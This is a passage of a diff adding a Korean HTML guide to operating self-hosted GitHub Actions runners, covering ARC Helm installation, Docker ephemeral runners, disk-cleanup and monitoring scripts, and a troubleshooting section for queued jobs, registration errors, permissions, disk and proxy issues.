+    <text x="562" y="92" class="svg-t" text-anchor="middle" fill="#34D3A6">runner Pod #1</text>
+    <text x="562" y="112" class="svg-s" text-anchor="middle">arch: amd64</text>
+    <text x="562" y="130" class="svg-s" text-anchor="middle">잡 1개 → 삭제</text>
+
+    <rect x="480" y="170" width="164" height="86" rx="9" fill="#101B1B" stroke="#34D3A6" stroke-opacity=".5"/>
+    <text x="562" y="196" class="svg-t" text-anchor="middle" fill="#34D3A6">runner Pod #2</text>
+    <text x="562" y="216" class="svg-s" text-anchor="middle">arch: arm64</text>
+    <text x="562" y="234" class="svg-s" text-anchor="middle">nodeSelector 분리</text>
+
+    <rect x="676" y="106" width="152" height="106" rx="9" fill="#121A24" stroke="#22303F"/>
+    <text x="752" y="132" class="svg-t" text-anchor="middle">특징</text>
+    <text x="752" y="154" class="svg-s" text-anchor="middle">· 잡마다 새 Pod</text>
+    <text x="752" y="172" class="svg-s" text-anchor="middle">· 오염 원천 차단</text>
+    <text x="752" y="190" class="svg-s" text-anchor="middle">· 0까지 축소 가능</text>
+
+    <line x1="190" y1="140" x2="252" y2="105" stroke="#7C93F5" stroke-width="1.5" marker-end="url(#akc)" class="flowline"/>
+    <line x1="440" y1="108" x2="474" y2="108" stroke="#34D3A6" stroke-width="1.5" marker-end="url(#ak)"/>
+    <line x1="348" y1="152" x2="348" y2="166" stroke="#22303F" stroke-width="1.5"/>
+    <line x1="440" y1="212" x2="474" y2="212" stroke="#34D3A6" stroke-width="1.5" marker-end="url(#ak)"/>
+  </svg>
+  <figcaption>ARC(Actions Runner Controller) — 컨트롤러가 GitHub의 잡 큐를 감시하다가 필요한 만큼 러너 Pod를 만들고, 잡이 끝나면 Pod를 지웁니다. 잡 간 격리와 오토스케일이 동시에 해결됩니다.</figcaption>
+  </figure>
+
+  <div class="code">
+    <div class="code-bar"><div class="tabs">
+      <button class="tab active" onclick="tab(this,0)">ARC 설치 (Helm)</button>
+      <button class="tab" onclick="tab(this,1)">values.yaml (멀티 아키텍처)</button>
+      <button class="tab" onclick="tab(this,2)">단독 Docker 러너</button>
+    </div><button class="copy" onclick="cp(this)">복사</button></div>
+
+    <div class="pane active"><pre><span class="c-cm"># 1) 컨트롤러 설치</span>
+<span class="c-pr">$ </span>helm install arc \
+    --namespace arc-systems --create-namespace \
+    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller
+
+<span class="c-cm"># 2) 러너 스케일셋 설치 (스케일셋 이름 = 워크플로우의 runs-on 값)</span>
+<span class="c-pr">$ </span>helm install arc-runner-set \
+    --namespace arc-runners --create-namespace \
+    --set githubConfigUrl=<span class="c-st">"https://github.com/my-company"</span> \
+    --set githubConfigSecret.github_token=<span class="c-st">"$GH_PAT"</span> \
+    --set minRunners=<span class="c-nu">1</span> --set maxRunners=<span class="c-nu">20</span> \
+    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set
+
+<span class="c-cm"># 3) 확인</span>
+<span class="c-pr">$ </span>kubectl get pods -n arc-systems
+<span class="c-pr">$ </span>kubectl get autoscalingrunnerset -n arc-runners
+<span class="c-out">NAME             MINIMUM   MAXIMUM   CURRENT   RUNNING   PENDING
+arc-runner-set   1         20        1         0         0</span>
+
+<span class="c-cm"># 4) 워크플로우에서 사용</span>
+<span class="c-cm">#    runs-on: arc-runner-set   ← 라벨 조합이 아니라 스케일셋 이름 그대로</span>
+
+<span class="c-cm"># 5) 문제 시 리스너 로그부터 확인</span>
+<span class="c-pr">$ </span>kubectl logs -n arc-systems -l app.kubernetes.io/component=runner-scale-set-listener -f</pre></div>
+
+    <div class="pane"><pre><span class="c-cm"># values-arm64.yaml — 이기종(x86 + ARM) 클러스터에서 아키텍처별 스케일셋 분리</span>
+<span class="c-yk">githubConfigUrl</span>: <span class="c-st">https://github.com/my-company</span>
+<span class="c-yk">githubConfigSecret</span>: <span class="c-st">arc-github-secret</span>   <span class="c-cm"># 미리 만든 Secret 참조 (권장)</span>
+
+<span class="c-yk">minRunners</span>: <span class="c-nu">0</span>
+<span class="c-yk">maxRunners</span>: <span class="c-nu">10</span>
+<span class="c-yk">runnerScaleSetName</span>: <span class="c-st">arc-arm64</span>          <span class="c-cm"># runs-on: arc-arm64</span>
+
+<span class="c-yk">containerMode</span>:
+  <span class="c-yk">type</span>: <span class="c-st">"dind"</span>          <span class="c-cm"># 컨테이너 빌드가 필요할 때. 대안: "kubernetes"</span>
+
+<span class="c-yk">template</span>:
+  <span class="c-yk">spec</span>:
+    <span class="c-yk">nodeSelector</span>:
+      <span class="c-yk">kubernetes.io/arch</span>: <span class="c-st">arm64</span>       <span class="c-cm"># ARM 노드에만 스케줄</span>
+    <span class="c-yk">tolerations</span>:
+      - <span class="c-yk">key</span>: <span class="c-st">"arch"</span>
+        <span class="c-yk">operator</span>: <span class="c-st">"Equal"</span>
+        <span class="c-yk">value</span>: <span class="c-st">"arm64"</span>
+        <span class="c-yk">effect</span>: <span class="c-st">"NoSchedule"</span>
+    <span class="c-yk">containers</span>:
+      - <span class="c-yk">name</span>: <span class="c-st">runner</span>
+        <span class="c-yk">image</span>: <span class="c-st">ghcr.io/actions/actions-runner:latest</span>
+        <span class="c-yk">command</span>: [<span class="c-st">"/home/runner/run.sh"</span>]
+        <span class="c-yk">resources</span>:
+          <span class="c-yk">requests</span>: { <span class="c-yk">cpu</span>: <span class="c-st">"2"</span>, <span class="c-yk">memory</span>: <span class="c-st">"4Gi"</span> }
+          <span class="c-yk">limits</span>:   { <span class="c-yk">cpu</span>: <span class="c-st">"6"</span>, <span class="c-yk">memory</span>: <span class="c-st">"12Gi"</span> }
+
+<span class="c-cm"># GPU 러너라면 limits에 nvidia.com/gpu: 1 을 추가하고</span>
+<span class="c-cm"># 별도 스케일셋(arc-gpu)으로 분리해 runs-on: arc-gpu 로 라우팅합니다.</span></pre></div>
+
+    <div class="pane"><pre><span class="c-cm"># Kubernetes 없이 Docker만으로 일회용 러너 굴리기</span>
+<span class="c-cm"># Dockerfile</span>
+<span class="c-kw">FROM</span> ghcr.io/actions/actions-runner:latest
+<span class="c-kw">USER</span> root
+<span class="c-kw">RUN</span> apt-get update &amp;&amp; apt-get install -y --no-install-recommends \
+      jq unzip make &amp;&amp; rm -rf /var/lib/apt/lists/*
+<span class="c-kw">USER</span> runner
+
+<span class="c-cm"># 실행 — ephemeral로 띄우고 종료되면 컨테이너도 삭제(--rm)</span>
+<span class="c-pr">$ </span>docker run -d --restart=no --rm \
+    -e RUNNER_NAME=<span class="c-st">"docker-eph-01"</span> \
+    -e RUNNER_SCOPE=<span class="c-st">"repo"</span> \
+    -e REPO_URL=<span class="c-st">"https://github.com/my-company/web-service"</span> \
+    -e ACCESS_TOKEN=<span class="c-st">"$GH_PAT"</span> \
+    -e LABELS=<span class="c-st">"self-hosted,Linux,X64,docker"</span> \
+    -e EPHEMERAL=<span class="c-st">"true"</span> \
+    my-runner:latest
+
+<span class="c-cm"># ⚠️ docker.sock 마운트는 편하지만 사실상 호스트 root 권한을 주는 것</span>
+<span class="c-cm">#    -v /var/run/docker.sock:/var/run/docker.sock  ← 신뢰된 Private 리포에서만</span>
+<span class="c-cm">#    가능하면 DinD(privileged) 또는 kaniko/buildkit rootless로 대체하세요.</span></pre></div>
+  </div>
+
+  <div class="note"><span class="cal-t">선택 가이드</span>
+    러너 <b>1~3대</b>: VM + systemd로 충분 · <b>4~20대</b>: 컨테이너 + ephemeral 루프 ·
+    <b>20대 이상 또는 K8s 보유</b>: ARC 스케일셋. 처음부터 ARC로 가면 학습 난이도가 급증하니
+    이 문서 6~7장을 손으로 한 번 해본 뒤 넘어가는 편이 좋습니다.
+  </div>
+</section>
+<!-- ============ 11 ============ -->
+<section id="s11">
+  <div class="sec-head"><div class="sec-num">11</div>
+    <div><h2>운영·유지보수 실무</h2>
+    <div class="sec-sub">설치는 10분, 운영은 계속입니다</div></div>
+  </div>
+
+  <h3>① 디스크 관리 — 장애 원인 1위</h3>
+  <p>
+    self-hosted 러너는 <b>정리를 안 해줍니다.</b> <code>_work</code>의 체크아웃 사본, Docker 이미지·빌드 캐시,
+    <code>_diag</code> 로그가 계속 쌓여 몇 주 만에 디스크를 채웁니다. 처음부터 정리 잡을 걸어두세요.
+  </p>
+  <div class="code">
+    <div class="code-bar"><div class="tabs">
+      <button class="tab active" onclick="tab(this,0)">cleanup-runner.sh</button>
+      <button class="tab" onclick="tab(this,1)">워크플로우 내 정리 스텝</button>
+    </div><button class="copy" onclick="cp(this)">복사</button></div>
+    <div class="pane active"><pre><span class="c-cm">#!/usr/bin/env bash</span>
+<span class="c-cm"># /opt/actions-runner/cleanup.sh — cron으로 매일 새벽 실행</span>
+<span class="c-cm"># crontab: 0 4 * * * /opt/actions-runner/cleanup.sh >> /var/log/runner-clean.log 2>&1</span>
+<span class="c-kw">set</span> -uo pipefail
+RUNNER_DIR=/opt/actions-runner
+
+<span class="c-kw">echo</span> <span class="c-st">"=== $(date '+%F %T') 정리 시작 ==="</span>
+df -h /opt | tail -1
+
+<span class="c-cm"># 1) 잡 실행 중이면 건너뛴다 (실행 중 삭제는 빌드를 깨뜨림)</span>
+<span class="c-kw">if</span> pgrep -f <span class="c-st">"Runner.Worker"</span> &gt;/dev/null; <span class="c-kw">then</span>
+  <span class="c-kw">echo</span> <span class="c-st">"잡 실행 중 → 정리 연기"</span>; <span class="c-kw">exit</span> <span class="c-nu">0</span>
+<span class="c-kw">fi</span>
+
+<span class="c-cm"># 2) 7일 이상 접근 없는 워크스페이스 삭제</span>
+find <span class="c-st">"$RUNNER_DIR/_work"</span> -maxdepth <span class="c-nu">1</span> -mindepth <span class="c-nu">1</span> -type d \
+     ! -name <span class="c-st">'_temp'</span> ! -name <span class="c-st">'_tool'</span> ! -name <span class="c-st">'_actions'</span> \
+     -atime +<span class="c-nu">7</span> -exec rm -rf {} +
+
+<span class="c-cm"># 3) 임시 디렉터리 비우기</span>
+rm -rf <span class="c-st">"$RUNNER_DIR/_work/_temp"</span>/* <span class="c-nu">2</span>&gt;/dev/null
+
+<span class="c-cm"># 4) 진단 로그는 14일치만 보관</span>
+find <span class="c-st">"$RUNNER_DIR/_diag"</span> -name <span class="c-st">'*.log'</span> -mtime +<span class="c-nu">14</span> -delete
+
+<span class="c-cm"># 5) Docker 정리 — 사용 중 이미지는 남기고 dangling만 제거</span>
+<span class="c-kw">if</span> <span class="c-kw">command</span> -v docker &gt;/dev/null; <span class="c-kw">then</span>
+  docker container prune -f --filter <span class="c-st">"until=24h"</span>
+  docker image prune -f --filter <span class="c-st">"until=168h"</span>       <span class="c-cm"># 7일</span>
+  docker builder prune -f --filter <span class="c-st">"until=168h"</span> --keep-storage <span class="c-nu">20</span>GB
+  docker volume prune -f
+<span class="c-kw">fi</span>
+
+<span class="c-kw">echo</span> <span class="c-st">"=== 정리 후 ==="</span>; df -h /opt | tail -1</pre></div>
+    <div class="pane"><pre><span class="c-cm"># 잡 자체에 정리 스텝을 넣는 방식 (권장 조합)</span>
+<span class="c-yk">jobs</span>:
+  <span class="c-yk">build</span>:
+    <span class="c-yk">runs-on</span>: [<span class="c-st">self-hosted</span>, <span class="c-st">Linux</span>, <span class="c-st">docker</span>]
+    <span class="c-yk">steps</span>:
+      <span class="c-cm"># 시작 전 이전 잡 잔여물 제거 (clean: true가 기본이지만 강제)</span>
+      - <span class="c-yk">uses</span>: <span class="c-st">actions/checkout@v4</span>
+        <span class="c-yk">with</span>:
+          <span class="c-yk">clean</span>: <span class="c-kw">true</span>
+          <span class="c-yk">fetch-depth</span>: <span class="c-nu">1</span>          <span class="c-cm"># 얕은 클론으로 디스크·시간 절약</span>
+
+      - <span class="c-yk">name</span>: <span class="c-st">디스크 여유 사전 확인 (부족하면 즉시 실패)</span>
+        <span class="c-yk">run</span>: |
+          FREE=$(df -BG --output=avail . | tail -1 | tr -dc <span class="c-st">'0-9'</span>)
+          <span class="c-kw">echo</span> <span class="c-st">"여유: ${FREE}GB"</span>
+          [ <span class="c-st">"$FREE"</span> -ge <span class="c-nu">10</span> ] || { <span class="c-kw">echo</span> <span class="c-st">"::error::디스크 부족"</span>; <span class="c-kw">exit</span> <span class="c-nu">1</span>; }
+
+      - <span class="c-yk">run</span>: docker build -t app:${{ github.sha }} .
+
+      <span class="c-cm"># 성공/실패 무관하게 항상 정리</span>
+      - <span class="c-yk">name</span>: <span class="c-st">작업 후 정리</span>
+        <span class="c-yk">if</span>: <span class="c-st">always()</span>
+        <span class="c-yk">run</span>: |
+          docker image rm app:${{ github.sha }} || <span class="c-kw">true</span>
+          docker builder prune -f --filter <span class="c-st">"until=24h"</span> || <span class="c-kw">true</span></pre></div>
+  </div>
+
+  <h3>② 러너 업그레이드</h3>
+  <ul>
+    <li><b>기본은 자동 업데이트</b>입니다. 러너는 새 버전이 나오면 스스로 내려받아 재시작합니다. 폐쇄망이라면 이게 실패하며 결국 잡을 못 받게 됩니다.</li>
+    <li>수동 업그레이드 순서: <code>svc.sh stop</code> → 새 tar.gz 덮어쓰기(<code>.credentials</code>·<code>.runner</code> 파일은 유지) → <code>svc.sh start</code>.</li>
+    <li>OS 패치·툴체인 업데이트 시에는 GitHub UI에서 러너를 <b>일시 정지</b>하는 대신, 라벨을 뺀 러너를 만들어 두거나 잡이 없는 시간대를 이용합니다.</li>
+  </ul>
+
+  <h3>③ 모니터링 — 무엇을 봐야 하나</h3>
+  <div class="tw"><table>
+    <thead><tr><th style="width:26%">지표</th><th style="width:36%">확인 방법</th><th>알람 기준(예시)</th></tr></thead>
+    <tbody>
+      <tr><td><strong>러너 온라인 여부</strong></td><td>REST API <code>GET /repos/{o}/{r}/actions/runners</code>의 <code>status</code></td><td>offline 5분 이상 지속</td></tr>
+      <tr><td><strong>큐 대기 시간</strong></td><td>워크플로우 잡의 <code>started_at - created_at</code></td><td>평균 3분 초과 → 러너 증설 신호</td></tr>
+      <tr><td><strong>디스크 사용률</strong></td><td>node_exporter <code>node_filesystem_avail_bytes</code></td><td>80% 경고 / 90% 위험</td></tr>
+      <tr><td><strong>러너 프로세스</strong></td><td><code>systemctl is-active 'actions.runner.*'</code></td><td>inactive 즉시 알람</td></tr>
+      <tr><td><strong>잡 실패율</strong></td><td>Actions API의 workflow run conclusion 집계</td><td>동일 러너에서 연속 3회 실패 → 격리 후 점검</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="code">
+    <div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">러너 상태 감시 스크립트</button></div>
+      <button class="copy" onclick="cp(this)">복사</button></div>
+    <div class="pane active"><pre><span class="c-cm">#!/usr/bin/env bash</span>
+<span class="c-cm"># 러너 상태를 API로 조회해 offline이면 알림 (cron 5분 주기)</span>
+ORG=<span class="c-st">"my-company"</span>
+<span class="c-cm"># 필요 권한: Org 러너 조회 → admin:org (또는 GitHub App)</span>
+curl -sS -H <span class="c-st">"Authorization: Bearer $GH_PAT"</span> \
+     -H <span class="c-st">"Accept: application/vnd.github+json"</span> \
+     <span class="c-st">"https://api.github.com/orgs/$ORG/actions/runners?per_page=100"</span> \
+| jq -r <span class="c-st">'.runners[] | [.name, .status, .busy, ([.labels[].name]|join("|"))] | @tsv'</span> \
+| <span class="c-kw">while</span> IFS=$<span class="c-st">'\t'</span> <span class="c-kw">read</span> -r name status busy labels; <span class="c-kw">do</span>
+    <span class="c-kw">printf</span> <span class="c-st">"%-22s %-8s busy=%-5s %s\n"</span> <span class="c-st">"$name"</span> <span class="c-st">"$status"</span> <span class="c-st">"$busy"</span> <span class="c-st">"$labels"</span>
+    <span class="c-kw">if</span> [ <span class="c-st">"$status"</span> = <span class="c-st">"offline"</span> ]; <span class="c-kw">then</span>
+      curl -sS -X POST <span class="c-st">"$SLACK_WEBHOOK"</span> \
+        -H <span class="c-st">'Content-Type: application/json'</span> \
+        -d <span class="c-st">"{\"text\":\":rotating_light: 러너 오프라인: $name\"}"</span>
+    <span class="c-kw">fi</span>
+<span class="c-kw">done</span>
+<span class="c-out">build-linux-01          online   busy=false  self-hosted|Linux|X64|docker
+build-linux-02          online   busy=true   self-hosted|Linux|X64|docker
+gpu-node-01             offline  busy=false  self-hosted|Linux|X64|gpu</span></pre></div>
+  </div>
+
+  <div class="tip"><span class="cal-t">운영 문서에 남겨둘 3가지</span>
+    ① 러너 목록(호스트·라벨·용도·담당자) ② 재설치 절차서(토큰 발급 경로 포함)
+    ③ "잡이 Queued에서 멈췄을 때" 1차 대응 절차. 신입이 새벽에 호출받아도 혼자 복구할 수 있게 만드는 것이 목표입니다.
+  </div>
+</section>
+
+<!-- ============ 12 ============ -->
+<section id="s12">
+  <div class="sec-head"><div class="sec-num">12</div>
+    <div><h2>트러블슈팅 14선</h2>
+    <div class="sec-sub">에러 메시지로 찾아 쓰는 사전 — 제목을 눌러 펼치세요</div></div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-01</span>
+      <span class="acc-t">잡이 "Queued"에서 영원히 멈춰 있다 (가장 흔한 문제)</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">Job is waiting for a runner to pick it up...
+(Actions 화면에 노란 점만 계속 표시, 에러 없음)</div>
+      <p><strong>원인 4가지를 순서대로 확인하세요.</strong></p>
+      <ol>
+        <li><b>라벨 불일치</b> — <code>runs-on</code>의 라벨을 러너가 <b>전부</b> 갖고 있어야 합니다. <code>Ubuntu</code>(러너엔 <code>Linux</code>), <code>x64</code> 오타, <code>gpu</code> vs <code>GPU</code> 같은 커스텀 라벨 누락이 대표적입니다.</li>
+        <li><b>러너 오프라인</b> — Settings → Runners에서 🔴 Offline이면 서비스가 죽은 것입니다.</li>
+        <li><b>러너가 이미 다른 잡 실행 중</b> — 러너 1대 = 동시 1잡. 큐가 쌓인 것이지 고장이 아닙니다.</li>
+        <li><b>범위 불일치</b> — 리포지토리 A에 등록한 러너를 리포지토리 B의 워크플로우가 쓰려 하는 경우. Org 러너로 옮기거나 Runner Group 접근 권한을 확인합니다.</li>
+      </ol>
+      <div class="code"><div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">진단 명령</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-cm"># 러너가 실제로 가진 라벨을 API로 확인 (오타 잡기)</span>
+<span class="c-pr">$ </span>curl -sS -H <span class="c-st">"Authorization: Bearer $GH_PAT"</span> \
+    <span class="c-st">"https://api.github.com/repos/OWNER/REPO/actions/runners"</span> \
+  | jq -r <span class="c-st">'.runners[] | "\(.name)\t\(.status)\t\([.labels[].name]|join(","))"'</span>
+<span class="c-out">build-linux-01   online   self-hosted,Linux,X64,docker,build</span>
+
+<span class="c-cm"># 워크플로우가 요구한 라벨과 눈으로 대조</span>
+<span class="c-pr">$ </span>grep -n <span class="c-st">"runs-on"</span> .github/workflows/*.yml</pre></div></div>
+      <p><b>예방</b> — 라벨은 워크플로우와 러너 등록 스크립트를 <b>한 파일에서 관리</b>하고, 신규 러너는 8장의 점검 워크플로우로 먼저 검증하세요.</p>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-02</span>
+      <span class="acc-t">러너가 Offline로 표시된다 / 갑자기 사라졌다</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">Runner "build-linux-01" is offline
+journalctl: Runner listener exited with error code 2</div>
+      <p><b>확인 순서</b></p>
+      <div class="code"><div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">bash</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-pr">$ </span>sudo systemctl status <span class="c-st">'actions.runner.*'</span> --no-pager   <span class="c-cm"># ① 서비스 살아있나</span>
+<span class="c-pr">$ </span>sudo journalctl -u <span class="c-st">'actions.runner.*'</span> -n <span class="c-nu">80</span> --no-pager  <span class="c-cm"># ② 마지막 에러</span>
+<span class="c-pr">$ </span>tail -n <span class="c-nu">100</span> /opt/actions-runner/_diag/Runner_*.log      <span class="c-cm"># ③ 상세 원인</span>
+<span class="c-pr">$ </span>curl -sS -o /dev/null -w <span class="c-st">'%{http_code}\n'</span> https://api.github.com  <span class="c-cm"># ④ 네트워크</span>
+<span class="c-pr">$ </span>df -h /opt; free -h                                 <span class="c-cm"># ⑤ 디스크/메모리</span>
+<span class="c-pr">$ </span>timedatectl                                          <span class="c-cm"># ⑥ 시간 동기화</span></pre></div></div>
+      <table style="width:100%;font-size:14.3px;margin-top:14px"><tbody>
+        <tr><td style="padding:6px 0"><b>서비스 dead</b></td><td><code>sudo ./svc.sh start</code>, <code>enable</code> 여부 확인</td></tr>
+        <tr><td style="padding:6px 0"><b>네트워크 차단</b></td><td>방화벽 정책 변경 여부, 프록시 인증 만료 확인</td></tr>
+        <tr><td style="padding:6px 0"><b>디스크 100%</b></td><td>11장 정리 스크립트 실행 후 재시작</td></tr>
+        <tr><td style="padding:6px 0"><b>OOM Kill</b></td><td><code>dmesg -T | grep -i oom</code> — MemoryMax 조정 또는 증설</td></tr>
+        <tr><td style="padding:6px 0"><b>GitHub에서 삭제됨</b></td><td>재등록 필요(<code>config.sh remove</code> → 다시 <code>config.sh</code>)</td></tr>
+      </tbody></table>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-03</span>
+      <span class="acc-t">config.sh에서 404 Not Found가 난다</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">Http response code: NotFound from 'POST https://api.github.com/actions/runner-registration'
+Response status code does not indicate success: 404 (Not Found)</div>
+      <ul>
+        <li><b>URL 형식 오류</b> — Repository 러너는 <code>https://github.com/OWNER/REPO</code>, Org 러너는 <code>https://github.com/ORG</code>입니다. 끝에 <code>.git</code>이나 <code>/settings</code>를 붙이면 404.</li>
+        <li><b>토큰 종류 불일치</b> — Org 화면에서 받은 토큰으로 리포지토리 URL에 등록하려는 경우(또는 반대).</li>
+        <li><b>권한 부족</b> — 리포 admin / Org owner가 아니면 등록 API가 404로 응답합니다(403이 아니라 404라 헷갈립니다).</li>
+        <li><b>GHES 환경</b> — <code>https://github.mycorp.com/OWNER/REPO</code>처럼 사내 도메인을 써야 합니다.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-04</span>
+      <span class="acc-t">"Invalid configuration provided for token" / 401 Unauthorized</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">Invalid configuration provided for token. Terminating unattended configuration.
+Response status code does not indicate success: 401 (Unauthorized)</div>
+      <p><b>등록 토큰이 만료된 것입니다(발급 후 약 1시간).</b> GitHub 화면을 새로고침해 새 토큰을 받아 다시 실행하세요.
+      401이 반복되면 다음도 함께 확인합니다.</p>
+      <ul>
+        <li>서버 <b>시간이 틀어진 경우</b> — 토큰 서명 검증 실패. <code>timedatectl set-ntp true</code></li>
+        <li>PAT를 <code>--token</code>에 그대로 넣은 경우 — <code>--token</code>은 <b>등록 토큰</b> 전용입니다. PAT는 <code>--pat</code>(또는 API로 등록 토큰 발급)에 사용합니다.</li>
+        <li>이미 등록된 러너 디렉터리에서 재실행 — <code>./config.sh remove --token &lt;새토큰&gt;</code>으로 정리 후 재등록</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-05</span>
+      <span class="acc-t">libicu / .NET 의존성 오류 (RHEL·Rocky·Alpine)</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">System.DllNotFoundException: Unable to load shared library 'libicuuc'
+Process terminated. Couldn't find a valid ICU package installed on the system.</div>
+      <div class="code"><div class="code-bar"><div class="tabs">
+        <button class="tab active" onclick="tab(this,0)">정석 해결</button>
+        <button class="tab" onclick="tab(this,1)">최후 수단</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-cm"># 러너 패키지에 포함된 의존성 설치 스크립트 사용 (가장 확실)</span>
+<span class="c-pr">$ </span>sudo /opt/actions-runner/bin/installdependencies.sh
+
+<span class="c-cm"># 수동 설치 — RHEL / Rocky 9</span>
+<span class="c-pr">$ </span>sudo dnf install -y libicu krb5-libs zlib openssl-libs lttng-ust
+
+<span class="c-cm"># Debian / Ubuntu</span>
+<span class="c-pr">$ </span>sudo apt-get install -y libicu72 libkrb5-3 zlib1g libssl3 liblttng-ust1</pre></div>
+      <div class="pane"><pre><span class="c-cm"># ICU를 설치할 수 없는 폐쇄망/최소 이미지에서만 (정렬·문자열 처리 동작이 달라짐)</span>
+<span class="c-pr">$ </span><span class="c-kw">echo</span> <span class="c-st">'DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1'</span> &gt;&gt; /opt/actions-runner/.env
+<span class="c-pr">$ </span>sudo systemctl restart <span class="c-st">'actions.runner.*'</span>
+
+<span class="c-cm"># Alpine 기반 컨테이너라면 musl 문제로 공식 러너가 동작하지 않습니다.</span>
+<span class="c-cm"># → glibc 기반 이미지(ubuntu/debian) 또는 ghcr.io/actions/actions-runner 사용</span></pre></div></div>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-06</span>
+      <span class="acc-t">docker 명령이 permission denied</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">permission denied while trying to connect to the Docker daemon socket
+at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.47/..."</div>
+      <div class="code"><div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">bash</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-cm"># 러너 실행 계정을 docker 그룹에 추가</span>
+<span class="c-pr">$ </span>sudo usermod -aG docker actions
+<span class="c-pr">$ </span>id actions
+<span class="c-out">uid=1001(actions) gid=1001(actions) groups=1001(actions),988(docker)</span>
+
+<span class="c-cm"># ★ 핵심: 그룹 변경은 프로세스 재시작 후에 적용됩니다</span>
+<span class="c-pr">$ </span>sudo systemctl restart <span class="c-st">'actions.runner.*'</span>
+
+<span class="c-cm"># 확인</span>
+<span class="c-pr">$ </span>sudo -u actions docker info | head -3</pre></div></div>
+      <div class="warn" style="margin-top:14px"><span class="cal-t">보안 메모</span>
+        docker 그룹 = 사실상 root 권한입니다. Public 리포에 붙은 러너에는 절대 부여하지 말고,
+        가능하면 rootless 빌더(buildkit, kaniko, podman)로 대체하세요.</div>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-07</span>
+      <span class="acc-t">No space left on device (디스크 풀)</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">fatal: cannot create directory at 'src/main': No space left on device
+##[error]Process completed with exit code 128.</div>
+      <div class="code"><div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">긴급 확보</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-cm"># 무엇이 먹고 있는지 확인 (상위 10개)</span>
+<span class="c-pr">$ </span>sudo du -xh --max-depth=<span class="c-nu">2</span> /opt/actions-runner <span class="c-nu">2</span>&gt;/dev/null | sort -rh | head -<span class="c-nu">10</span>
+<span class="c-pr">$ </span>docker system df
+<span class="c-out">TYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLE
+Images          142       6         88.4GB    81.2GB (91%)
+Build Cache     2103      0         31.7GB    31.7GB</span>
+
+<span class="c-cm"># 즉시 회수 (잡이 없는 시점에)</span>
+<span class="c-pr">$ </span>docker builder prune -af
+<span class="c-pr">$ </span>docker image prune -af --filter <span class="c-st">"until=48h"</span>
+<span class="c-pr">$ </span>rm -rf /opt/actions-runner/_work/_temp/*
+<span class="c-pr">$ </span>find /opt/actions-runner/_diag -name <span class="c-st">'*.log'</span> -mtime +<span class="c-nu">7</span> -delete
+
+<span class="c-cm"># inode 고갈도 같은 에러를 냅니다 (node_modules가 주범)</span>
+<span class="c-pr">$ </span>df -i /opt</pre></div></div>
+      <p><b>예방</b> — 11장의 cron 정리 + <code>_work</code>를 별도 볼륨으로 분리 + 잡에 <code>fetch-depth: 1</code> 적용.</p>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-h" onclick="acc(this)"><span class="acc-code">TS-08</span>
+      <span class="acc-t">SSL certificate problem / 프록시 407 오류</span><span class="acc-x">+</span></button>
+    <div class="acc-b">
+      <div class="sym">fatal: unable to access 'https://github.com/...': SSL certificate problem: self signed certificate in certificate chain
+Response status code does not indicate success: 407 (Proxy Authentication Required)</div>
+      <p>사내 프록시가 TLS를 가로채(SSL inspection) 자체 CA로 재서명하는 환경에서 발생합니다.</p>
+      <div class="code"><div class="code-bar"><div class="tabs"><button class="tab active" onclick="tab(this,0)">해결</button></div><button class="copy" onclick="cp(this)">복사</button></div>
+      <div class="pane active"><pre><span class="c-cm"># ① 사내 루트 CA를 OS 신뢰 저장소에 등록 (근본 해결)</span>
+<span class="c-pr">$ </span>sudo cp corp-root-ca.crt /usr/local/share/ca-certificates/
+<span class="c-pr">$ </span>sudo update-ca-certificates          <span class="c-cm"># RHEL: update-ca-trust extract</span>
+
+<span class="c-cm"># ② 러너/Git/Node에 CA 경로 알려주기 — .env에 기록하면 서비스에도 적용</span>
+<span class="c-pr">$ </span><span class="c-kw">cat</span> &gt;&gt; /opt/actions-runner/.env &lt;&lt;<span class="c-st">'EOF'</span>
+<span class="c-st">https_proxy=http://user:pass@proxy.corp.local:3128
+no_proxy=localhost,127.0.0.1,.corp.local
+NODE_EXTRA_CA_CERTS=/etc/ssl/certs/ca-certificates.crt
